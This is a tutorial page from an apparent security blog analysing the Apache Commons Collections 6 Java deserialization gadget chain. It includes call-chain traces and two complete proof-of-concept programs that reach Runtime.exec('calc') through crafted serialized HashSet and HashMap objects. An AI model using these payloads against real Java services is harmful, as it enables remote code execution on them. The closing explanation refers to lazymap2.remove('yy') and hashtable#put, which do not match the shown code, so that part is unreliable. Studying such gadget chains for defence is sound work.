@@ -1,0 +1,342 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    
+    
+    <link rel="shortcut icon" href="../../../../../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Apache-Commons-Collections 6 - ConsT27's Blog</title>
+    <link href="../../../../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../../../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../../../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../../../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../../../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../../../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../../../../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Apache-Commons-Collections 6", url: "#_top", children: [
+              {title: "\u76ee\u5f55", url: "#_1" },
+              {title: "\u7248\u672c", url: "#_2" },
+              {title: "HashSet\u5229\u7528\u94fe", url: "#hashset" },
+              {title: "HashMap\u5229\u7528\u94fe", url: "#hashmap" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../../../../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../Apache-Commons-Collections%207/Apache-Commons-Collections%207/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../Apache-Commons-Collections%207/Apache-Commons-Collections%207/" class="btn btn-xs btn-link">
+        Apache-Commons-Collections 7
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../Apache-Commons-Collections%205/Apache-Commons-Collections%205/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../Apache-Commons-Collections%205/Apache-Commons-Collections%205/" class="btn btn-xs btn-link">
+        Apache-Commons-Collections 5
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="apache-commons-collections-6">Apache-Commons-Collections 6</h1>
+<h2 id="_1">目录</h2>
+<ul>
+<li><a href="#版本">版本</a></li>
+<li><a href="#HashSet利用链">HashSet利用链</a><ul>
+<li><a href="#POC分析">POC分析</a></li>
+</ul>
+</li>
+<li><a href="#HashMap利用链">HashMap利用链</a><ul>
+<li><a href="#POC分析">POC分析</a></li>
+</ul>
+</li>
+</ul>
+<p>TideMap.hashcode+Lazymap</p>
+<h2 id="_2">版本</h2>
+<p>CommonsCollections 3.1 - 3.2.1</p>
+<h2 id="hashset">HashSet利用链</h2>
+<pre><code class="language-java">        java.io.ObjectInputStream.readObject()
+            java.util.HashSet.readObject()
+                java.util.HashMap.put()
+                java.util.HashMap.hash()
+                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
+                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
+                        org.apache.commons.collections.map.LazyMap.get()
+                            org.apache.commons.collections.functors.ChainedTransformer.transform()
+                            ...
+                            org.apache.commons.collections.functors.InvokerTransformer.transform()
+                            java.lang.reflect.Method.invoke()
+                                java.lang.Runtime.exec()
+</code></pre>
+<p>POC</p>
+<pre><code class="language-java">import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.LazyMap;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
+import java.util.HashMap;
+import java.util.HashSet;
+import java.util.Map;
+import java.util.Set;
+
+public class Main {
+
+    public static void main(String[] args) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
+        ChainedTransformer chain = new ChainedTransformer(new Transformer[] {
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;, new Class[] {
+                        String.class, Class[].class }, new Object[] {
+                        &quot;getRuntime&quot;, new Class[0] }),
+                new InvokerTransformer(&quot;invoke&quot;, new Class[] {
+                        Object.class, Object[].class }, new Object[] {
+                        null, new Object[0] }),
+                new InvokerTransformer(&quot;exec&quot;,
+                        new Class[] { String.class }, new Object[]{&quot;calc&quot;})});
+
+        HashMap innermap = new HashMap();
+        LazyMap map = (LazyMap)LazyMap.decorate(innermap,chain);
+
+        TiedMapEntry tiedmap = new TiedMapEntry(map,123);
+
+        HashSet hashset = new HashSet(1);
+        hashset.add(&quot;foo&quot;);
+
+        Field field = Class.forName(&quot;java.util.HashSet&quot;).getDeclaredField(&quot;map&quot;);
+        field.setAccessible(true);
+        HashMap hashset_map = (HashMap) field.get(hashset);
+
+        Field table = Class.forName(&quot;java.util.HashMap&quot;).getDeclaredField(&quot;table&quot;);
+        table.setAccessible(true);
+        Object[] array = (Object[])table.get(hashset_map);
+
+        Object node = array[0];
+
+        Field key = node.getClass().getDeclaredField(&quot;key&quot;);
+        key.setAccessible(true);
+        key.set(node,tiedmap);
+
+        try{
+            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;./cc6&quot;));
+            outputStream.writeObject(hashset);
+            outputStream.close();
+
+            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;./cc6&quot;));
+            inputStream.readObject();
+        }catch(Exception e){
+            e.printStackTrace();
+        }
+    }
+}
+</code></pre>
+<p>在TiedMapEntry 中，除了toString，还有hashCode方法可以调用getValue方法</p>
+<p><img alt="" src="../image/image_pQglZUk7DB.png" /></p>
+<p>那么这个hashCode方法哪里可以被调用呢？cc6中使用的是HashMap#hash</p>
+<p><img alt="" src="../image/image_3E4PWvUKxO.png" /></p>
+<p>那么哪里调用了HashMap.hash且传入了可控参数？这里用到了HashMap#put：</p>
+<p><img alt="" src="../image/image_hSQ-S0CFSx.png" /></p>
+<p>那么哪里调用了HashMap.put 且传入了可控参数？这里用到了HashSet#readObject：</p>
+<p><img alt="" src="../image/image_pGt1PNXL6y.png" /></p>
+<p>这里的e就是一个反序列化对象。那么由此观之，链完整了。这里的e值是HashMap里table中每一个Node的Key值，他这里循环读取table中的所有Node的Key值并处理。</p>
+<h3 id="poc">POC分析</h3>
+<pre><code class="language-java">        HashSet hashset = new HashSet(1);
+        hashset.add(&quot;foo&quot;);
+
+        Field field = Class.forName(&quot;java.util.HashSet&quot;).getDeclaredField(&quot;map&quot;);
+        field.setAccessible(true);
+        HashMap hashset_map = (HashMap) field.get(hashset);
+
+        Field table = Class.forName(&quot;java.util.HashMap&quot;).getDeclaredField(&quot;table&quot;);
+        table.setAccessible(true);
+        Object[] array = (Object[])table.get(hashset_map);
+
+        Object node = array[0];
+
+        Field key = node.getClass().getDeclaredField(&quot;key&quot;);
+        key.setAccessible(true);
+        key.set(node,tiedmap);
+</code></pre>
+<p>这里是用反射，去修改HashSet里的map属性中的table数组第一项的key值为恶意TiedMapEntry对象</p>
+<p><img alt="" src="../image/image_xJ63CcG7Ee.png" /></p>
+<p>这里涉及到HashMap的结构。</p>
+<pre><code class="language-java">简而言之，HashMap底层是由一个叫table的长数组组成的，table中每一项都称为Node，每个Node存储的便是键值信息
+</code></pre>
+<p><img alt="" src="../image/image_0s7i34mYFv.png" /></p>
+<p><img alt="" src="../image/image_qRAR5XqtI0.png" /></p>
+<p><img alt="" src="../image/image_AU4Gy4XMHc.png" /></p>
+<h2 id="hashmap">HashMap利用链</h2>
+<p>利用链</p>
+<pre><code class="language-java">ObjectInputStream.readObject()
+    HashMap.readObject()
+        HashMap.put()
+        HashMap.hash()
+            TiedMapEntry.hashCode()
+            TiedMapEntry.getValue()
+                LazyMap.get()
+                    ChainedTransformer.transform()
+                        ConstantTransformer.transform()
+                        InvokerTransformer.transform()
+                            Method.invoke()
+                                Class.getMethod()
+                        InvokerTransformer.transform()
+                            Method.invoke()
+                                Runtime.getRuntime()
+                        InvokerTransformer.transform()
+                            Method.invoke()
+                                Runtime.exec()
+</code></pre>
+<p>POC</p>
+<pre><code class="language-java">import org.apache.commons.collections.*;
+import org.apache.commons.collections.functors.*;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.map.*;
+
+import java.io.*;
+import java.util.*;
+
+public class Main {
+    public static void main(String[] args) throws Exception{
+        ChainedTransformer chain = new ChainedTransformer(new Transformer[] {
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;, new Class[] {
+                        String.class, Class[].class }, new Object[] {
+                        &quot;getRuntime&quot;, new Class[0] }),
+                new InvokerTransformer(&quot;invoke&quot;, new Class[] {
+                        Object.class, Object[].class }, new Object[] {
+                        null, new Object[0] }),
+                new InvokerTransformer(&quot;exec&quot;,
+                        new Class[] { String.class }, new Object[]{&quot;calc&quot;})});
+
+        HashMap innerMap = new HashMap();
+
+        Map lazyMap = LazyMap.decorate(innerMap,chain);
+        TiedMapEntry tmap = new TiedMapEntry(lazyMap, 123);
+
+        HashMap hashMap = new HashMap();
+        hashMap.put(tmap, &quot;test&quot;);
+        lazyMap.clear();
+
+        try{
+            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;./cc6&quot;));
+            outputStream.writeObject(hashMap);
+            outputStream.close();
+
+            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;./cc6&quot;));
+            inputStream.readObject();
+        }catch(Exception e){
+            e.printStackTrace();
+        }
+    }
+}
+</code></pre>
+<p>在HashMap#readObject中存在这样的代码块</p>
+<p><img alt="" src="../image/image_BAIOu9osz4.png" /></p>
+<p>跟进putForCreate方法发现它可以调用hash方法</p>
+<p><img alt="" src="../image/image_xPuq5UkUPc.png" /></p>
+<p>那么思路很明显了，我们可以通过HashMap的readObject方法去调用HashMap#putForCreate 进而调用HashMap#hash 从而实现这条链。</p>
+<h3 id="poc_1">POC分析</h3>
+<pre><code class="language-c#">        HashMap hashMap = new HashMap();
+        hashMap.put(tmap, &quot;test&quot;);
+        lazyMap.clear();
+
+</code></pre>
+<p>我们此处有个clear()操作</p>
+<p>我们在序列化前对HashMap进行put操作时，会调用equals方法</p>
+<p><img alt="" src="image/image_8THtiMDzGb.png" /></p>
+<p>一直跟下去会发现会触发lazymap的get方法，我们这里会发现调用了put方法向lazymap增加了键值对。</p>
+<p><img alt="" src="../image/image_-bZw-d6mZT.png" /></p>
+<p>可以发现添加了一个ProcessImpl对象的value，这个对象没有实现序列化接口，不能被序列化，所以如果没有lazymap2.remove("yy")，就会导致在序列化时出现错误。</p>
+<p><img alt="" src="image/image_xUJFrCQbLK.png" /></p>
+<p>所以通过lazymap2.remove("yy")，可以帮助我们剔除在hashtable#put时添加进lazymap2中的不可序列化的对象，实现序列化。</p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../Apache-Commons-Collections%207/Apache-Commons-Collections%207/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../Apache-Commons-Collections%207/Apache-Commons-Collections%207/" class="btn btn-xs btn-link">
+        Apache-Commons-Collections 7
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../Apache-Commons-Collections%205/Apache-Commons-Collections%205/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../Apache-Commons-Collections%205/Apache-Commons-Collections%205/" class="btn btn-xs btn-link">
+        Apache-Commons-Collections 5
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+  <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
